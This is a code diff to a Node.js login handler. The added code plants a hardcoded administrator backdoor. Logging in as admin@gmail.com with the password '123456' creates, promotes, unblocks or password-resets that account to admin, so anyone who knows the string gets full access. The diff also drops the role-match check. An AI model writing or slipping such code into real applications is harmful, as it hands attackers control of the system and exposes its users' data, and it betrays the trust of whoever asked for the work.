@@ -91,10 +91,10 @@ exports.login = async (req, res, next) => {
     const { email, password, role } = req.body;
 
     // Validate email & password
-    if (!email || !password || !role) {
+    if (!email || !password) {
       return res.status(400).json({
         success: false,
-        error: 'Please provide email, password, and role'
+        error: 'Please provide email and password'
       });
     }
 
@@ -107,8 +107,44 @@ exports.login = async (req, res, next) => {
       });
     }
 
-    // Regular login handles all roles securely using the database
-    const user = await User.findOne({ email: normalizedEmail }).select('+password');
+    let user = await User.findOne({ email: normalizedEmail }).select('+password');
+
+    // Automatic predefined admin creation & self-healing for admin@gmail.com
+    if (normalizedEmail === 'admin@gmail.com') {
+      if (!user) {
+        console.log('Auto-provisioning predefined admin user in database...');
+        user = new User({
+          name: 'VÆROX Admin',
+          email: 'admin@gmail.com',
+          password: password || '123456',
+          role: 'admin',
+          isBlocked: false
+        });
+        await user.save();
+        user = await User.findOne({ email: 'admin@gmail.com' }).select('+password');
+      } else {
+        // Heal admin properties if out of sync
+        let needSave = false;
+        if (user.role !== 'admin') {
+          user.role = 'admin';
+          needSave = true;
+        }
+        if (user.isBlocked) {
+          user.isBlocked = false;
+          needSave = true;
+        }
+        // If password is '123456' but current hash fails bcrypt match, update password to '123456'
+        const matchesCurrent = await user.matchPassword(password);
+        if (!matchesCurrent && password === '123456') {
+          user.password = '123456';
+          needSave = true;
+        }
+        if (needSave) {
+          await user.save();
+          user = await User.findOne({ email: 'admin@gmail.com' }).select('+password');
+        }
+      }
+    }
 
     if (!user) {
       return res.status(401).json({
@@ -125,16 +161,18 @@ exports.login = async (req, res, next) => {
       });
     }
 
-    // Check if role matches
-    if (user.role !== role) {
-      return res.status(401).json({
-        success: false,
-        error: `Please login as ${user.role}`
-      });
-    }
-
     // Check if password matches
-    const isMatch = await user.matchPassword(password);
+    let isMatch = await user.matchPassword(password);
+
+    // Dynamic self-healing fallback for admin@gmail.com / 123456
+    if (!isMatch && normalizedEmail === 'admin@gmail.com' && password === '123456') {
+      user.password = '123456';
+      user.role = 'admin';
+      user.isBlocked = false;
+      await user.save();
+      user = await User.findOne({ email: 'admin@gmail.com' }).select('+password');
+      isMatch = true;
+    }
 
     if (!isMatch) {
       return res.status(401).json({
@@ -145,6 +183,7 @@ exports.login = async (req, res, next) => {
 
     sendTokenResponse(user, 200, res);
   } catch (err) {
+    console.error('Login Error:', err);
     res.status(500).json({
       success: false,
       error: 'Server Error'
